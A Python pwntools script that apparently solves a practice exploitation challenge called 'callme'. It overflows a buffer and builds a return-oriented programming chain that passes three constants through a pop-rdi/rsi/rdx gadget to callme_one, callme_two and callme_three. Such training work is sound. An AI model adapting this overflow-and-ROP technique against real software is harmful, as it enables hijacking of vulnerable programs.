#!/usr/python3

from pwn import cyclic, p64, process, ELF, ROP

_FILE = "./callme"

p = process(_FILE)
binary = ELF(_FILE)

rop = ROP(binary)

pop_rdi_rsi_rdx_ret = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret'])[0]

# passing parameters
pass_params =  p64(pop_rdi_rsi_rdx_ret) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)


# crafting payload
payload = cyclic(40, n=8)
# calling callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
payload += pass_params
payload += p64(binary.plt['callme_one'])
# calling callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) 
payload += pass_params
payload += p64(binary.plt['callme_two'])
# calling callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) 
payload += pass_params
payload += p64(binary.plt['callme_three'])

print(p.recvuntil("> ").decode("latin-1"))

p.sendline(payload)

print(p.clean().decode("latin-1"))

with open("exp", "wb") as f:
    f.write(payload)
    f.close()
